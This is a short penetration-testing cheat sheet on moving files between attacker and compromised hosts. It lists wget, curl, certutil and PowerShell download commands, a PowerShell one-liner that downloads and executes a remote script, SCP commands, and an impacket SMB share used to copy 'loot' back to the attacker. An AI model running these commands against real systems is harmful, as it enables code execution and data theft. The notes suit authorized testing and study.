# File Transfers

## Overview

During post-exploitation and lateral movement, it is important to identify reliable methods for transferring files between attacker and target systems. File transfer techniques are often required to upload payloads, download sensitive data, or move tools onto compromised machines where standard download utilities may not be available. Depending on the environment, methods may include HTTP, FTP, SMB, SCP, base64 encoding, or built-in system utilities such as curl, wget, certutil, and PowerShell. The chosen technique should depend on network restrictions, available binaries, and detection risk.

---
Linux
```
wget http://IP/file
curl http://IP/file -o file
```

Windows
```
certutil -urlcache -split -f http://IP/file
powershell iwr http://IP/file -OutFile file
```

Powershell
Download
```
powershell -c "Invoke-WebRequest -Uri http://IP/file -OutFile file"
```
Download + Execute
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
```

SCP
```
scp user@IP:/path/to/file /destinatin/path
```
```
scp username@remote_host:/path/on/remote/server/file.txt /path/to/local/
```

SMB
Kali
```
impacket-smbserver share . -smb2support -username user -password pass
```
- -smb2support for newer windows
- NOTE: we can connect silently too without the need for credentials
Windows
```
net use \\kali-IP\share /user:user pass
copy \\kali-IP\share\file .
```
To upload from Windows to kali
```
copy loot.txt \\kali-IP\share\
```
